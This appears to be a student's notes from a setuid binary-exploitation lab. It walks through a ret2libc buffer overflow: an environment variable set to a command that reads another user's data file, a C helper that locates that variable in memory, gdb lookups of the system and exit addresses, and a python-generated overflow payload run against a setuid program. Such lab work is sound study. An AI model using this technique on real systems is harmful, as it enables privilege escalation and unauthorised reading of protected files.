lab@crunchbang:~$ ls -l
total 88
-r-sr-xr-x 1 railsfax   railsfax    5834 Dec 14  2014 2runMe
-r--r--r-- 1 railsfax   railsfax     287 Dec 14  2014 2runMe.C
-r-sr-xr-x 1 missionmug missionmug  5776 Dec 14  2014 3runMe
-r-sr-xr-x 1 bluefoggy  bluefoggy  14071 Dec 16  2014 4runMe
-r--r--r-- 1 bluefoggy  bluefoggy    137 Dec 16  2014 4runMe.C
-r-sr-xr-x 1 cookbee    cookbee     5096 Dec 16  2014 5runMe
-r--r--r-- 1 cookbee    cookbee       72 Dec 16  2014 5runMe.C
-r-------- 1 lab        lab           33 Dec 12  2014 data.txt
-rwxr-xr-x 1 lab        lab         5548 Dec  2 17:37 getenv
-rw-r--r-- 1 lab        lab          420 Dec  2 17:35 getenv.c
-rw-r--r-- 1 lab        lab           74 Dec  2 18:03 l.C
-rwxr-xr-x 1 lab        lab            0 Dec  2 18:09 less
-r-sr-xr-x 1 seetow     seetow      5071 Dec 14  2014 runMe
-r--r--r-- 1 seetow     seetow        74 Dec 14  2014 runMe.C
-rw-r--r-- 1 lab        lab           11 Dec  2 17:46 trial.txt

execute as/same group access/my access
creator info
how big is the file
date and file name

Set A random environment variable as a commmand to use
(can inject python code to have it execute by overwritting its return address)
lab@crunchbang:~$ export JINGNING="cat /home/bluefoggy/data.txt"
lab@crunchbang:~$ echo $JINGNING
cat /home/bluefoggy             #check if it is truely changed


Getenv function .c file

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[]) {
   char *ptr;
 
   if(argc < 3) {
      printf("Usage: %s <environment var> <target program name>\n", argv[0]); 
      exit(0);
   }
   ptr = getenv(argv[1]); /* Get env var location. */
   ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* Adjust for program name. */
   printf("%s will be at %p\n", argv[1], ptr);
}


lab@crunchbang:~$ gdb -q 4runMe
Reading symbols from /home/lab/4runMe...done.
(gdb) p system
No symbol "system" in current context.
(gdb) b main
Breakpoint 1 at 0x80485e5: file runMe4.C, line 17.
(gdb) run
Starting program: /home/lab/4runMe 

Breakpoint 1, main (argc=1, argv=0xbffff7c4) at runMe4.C:17
17	runMe4.C: No such file or directory.
(gdb) p system 
$1 = {<text variable, no debug info>} 0xb7d74c30 <system>       #this number is going to be use to overwrite the return address1
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7d68270 <exit>         #this number is going to be use to overwrite the return address2


insert python code to overwrite the returned address
lab@crunchbang:~$ ./HiDontDeleteMe JINGNING 4runMe
JINGNING will be at 0xbfffff79
lab@crunchbang:~$ ./4runMe $(python -c 'print "i" * 22+ "\x30\x4c\xd7\xb7" + "\x70\x82\xd6\xb7" + "\x75\xff\xff\xbf"')
The impressionism of mobility is rather open-minded in its empiricism.





